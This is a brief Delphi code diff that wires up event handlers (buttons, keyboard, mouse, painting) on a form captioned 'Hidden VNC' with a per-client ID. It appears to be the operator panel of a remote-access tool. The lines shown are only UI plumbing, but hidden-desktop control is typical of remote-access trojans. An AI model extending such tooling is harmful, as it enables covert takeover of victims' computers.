@@ -138,6 +138,24 @@ begin
   FSendJSON   := ASendJSON;
   FUnregister := AUnregister;
   Caption     := 'Hidden VNC - ' + FClientID;
+
+  { Reset UI state }
+  FIsCapturing    := False;
+  Button1.Caption := 'Start Capturing';
+  Button1.OnClick := Button1Click;
+  Button2.OnClick := Button2Click;
+  Button3.OnClick := Button3Click;
+  ComboBox1.OnChange := ComboBox1Change;
+
+  OnClose := FormClose;
+  OnKeyDown := FormKeyDown;
+  OnKeyUp := FormKeyUp;
+
+  PaintBox1.OnMouseDown := PaintBox1MouseDown;
+  PaintBox1.OnMouseMove := PaintBox1MouseMove;
+  PaintBox1.OnMouseUp   := PaintBox1MouseUp;
+  PaintBox1.OnPaint     := PaintBox1Paint;
+
   LogToStatus('Ready');
 end;
 
